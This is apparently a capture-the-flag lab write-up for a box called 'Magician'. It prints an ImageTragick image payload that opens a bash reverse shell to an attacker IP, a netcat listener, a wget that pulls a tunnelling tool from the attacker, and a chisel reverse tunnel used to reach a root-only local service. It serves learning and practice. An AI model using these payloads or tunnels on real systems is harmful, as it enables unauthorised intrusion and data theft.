@@ -1,0 +1,160 @@
+open ports:8080,22,21,8081
+
+Used ftp, and discovered some precious hints: https://imagetragick.com , and it´s a thing called 'delay_successful_login' in /etc/vsftpd.conf.
+
+:~/Magician# ftp magician
+Connected to magician.
+220 THE MAGIC DOOR
+Name (magician:root): anonymous
+331 Please specify the password.
+Password:
+230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
+230 Login successful.
+ftp>
+
+— Googled ImageTragick , and discovered CVE-2016-3714 here.
+
+— Searched for an exploit for the discovered vulnerability. Decided to used this one here.
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg";|ls "-la)'
+pop graphic-context
+
+— Created an image.png.
+
+~/Magician#:~# cat > image.png << EOF
+> push graphic-context
+> viewbox 0 0 1 1
+> affine 1 0 0 1 0 0
+> push graphic-context
+> image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/Attack_IP/Attack_Port 0<&1 2>&1'
+> pop graphic-context
+> pop graphic-context
+> EOF
+
+— Set up a listener.
+
+:~/Magician# nc -lvnp 4444
+
+— Uploaded image.png.
+
+— Used cat to inspect the conte of the_magic_continues. Discovered that we need to listen locally!
+
+magician@magician:~$ ls -la
+ls -la
+total 17204
+drwxr-xr-x 5 magician magician     4096 Feb 13  2021 .
+drwxr-xr-x 3 root     root         4096 Jan 30  2021 ..
+lrwxrwxrwx 1 magician magician        9 Feb  6  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 magician magician      220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 magician magician     3771 Apr  4  2018 .bashrc
+drwx------ 2 magician magician     4096 Jan 30  2021 .cache
+drwx------ 3 magician magician     4096 Jan 30  2021 .gnupg
+-rw-r--r-- 1 magician magician      807 Apr  4  2018 .profile
+-rw-r--r-- 1 magician magician        0 Jan 30  2021 .sudo_as_admin_successful
+-rw------- 1 magician magician     7546 Jan 31  2021 .viminfo
+-rw-r--r-- 1 root     root     17565546 Jan 30  2021 spring-boot-magician-backend-0.0.1-SNAPSHOT.jar
+-rw-r--r-- 1 magician magician      170 Feb 13  2021 the_magic_continues
+drwxr-xr-x 2 root     root         4096 Feb  5  2021 uploads
+-rw-r--r-- 1 magician magician       24 Jan 30  2021 user.txt
+magician@magician:~$ cat the_magic_continues
+cat the_magic_continues
+The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
+
+— Performed some privilege escalation enumeration to understand the possibilities. The most important discovery was that the Target VM is listening at 127.0.0.1:6666.
+
+magician@magician:~$ id
+id
+uid=1000(magician) gid=1000(magician) groups=1000(magician)
+magician@magician:~$ sudo -l
+sudo -l
+sudo: no tty present and no askpass program specified
+magician@magician:~$ find / -type f -perm -04000 -ls 2>/dev/null
+find / -type f -perm -04000 -ls 2>/dev/null
+   655479     64 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /bin/ping
+   665009     28 -rwsr-xr-x   1 root     root        26696 Sep 16  2020 /bin/umount
+   655428     32 -rwsr-xr-x   1 root     root        30800 Aug 11  2016 /bin/fusermount
+   655385     44 -rwsr-xr-x   1 root     root        43088 Sep 16  2020 /bin/mount
+   655495     44 -rwsr-xr-x   1 root     root        44664 Mar 22  2019 /bin/su
+   133882    112 -rwsr-xr-x   1 root     root       113528 Nov 19  2020 /usr/lib/snapd/snap-confine
+   133494     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+   133676    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+   264928    100 -rwsr-xr-x   1 root     root       100760 Nov 22  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+   133680     16 -rwsr-xr-x   1 root     root        14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+   133487     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   133302     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+   133124     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
+   133014     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
+   132868     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
+   133141     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
+   133123     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
+   132921     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
+   133125     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
+   132919     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
+   133161     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
+   135994    148 -rwsr-xr-x   1 root     root         149080 Jan 19  2021 /usr/bin/sudo
+magician@magician:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user command
+17 * * * * root    cd / && run-parts --report /etc/cron.hourly
+25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+agician@magician:~$ netstat -ano
+netstat -ano
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+tcp        0      0 127.0.0.1:6666          0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 0.0.0.0:8081            0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 Attack_IP:47892         Attack_IP:4444          ESTABLISHED off (0.00/0/0)
+tcp6       0      0 :::8080                 :::*                    LISTEN      off (0.00/0/0)
+tcp6       0      0 :::21                   :::*                    LISTEN      off (0.00/0/0)
+tcp6       0      0 Target_IP:8080          Attack_IP:36428         ESTABLISHED off (0.00/0/0)
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           off (0.00/0/0)
+udp        0      0 Target_IP:68            0.0.0.0:*                           off (0.00/0/0)
+raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
+...
+
+— Added 127.0.0.1 localhost to /etc/hosts.
+
+:~/Magician# echo '127.0.0.1 localhost' >> /etc/hosts
+
+— Located chisel, and copied to the directory I was working. chisel
+is a command-line utility used for tunneling traffic, that helps creating a secure endpoint into a network or pass through firewalls.
+— Set up a server.
+
+:/Magician# python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+Target_IP - - [25/Feb/2025...] "GET /chisel HTTP/1.1" 200 -
+
+— Used wget to upload chisel to the Target VM.
+
+magician@magician:/tmp$ wget http://Attack_IP:Attack_Port/chisel
+
+— Wow, that is the fourth time I apply chisel . It was a great learning experience!
+
+. In your Attack VM run:
+
+:~/Magician# ./chisel server --reverse --port Chosen_Port_A
+
+. In the Target VM run:
+
+magician@magician:/tmp$ chmod +x chisel
+...
+magician@magician:/tmp$ ./chisel client Attack_IP:Chosen_Port_A R:Chosen_Port_B:localhost:Target_Port_Listening
+...
+
+— Visited localhost:5555.
+
+— Entered /root/root.txt as filename, clicked Submit , and clicked again.
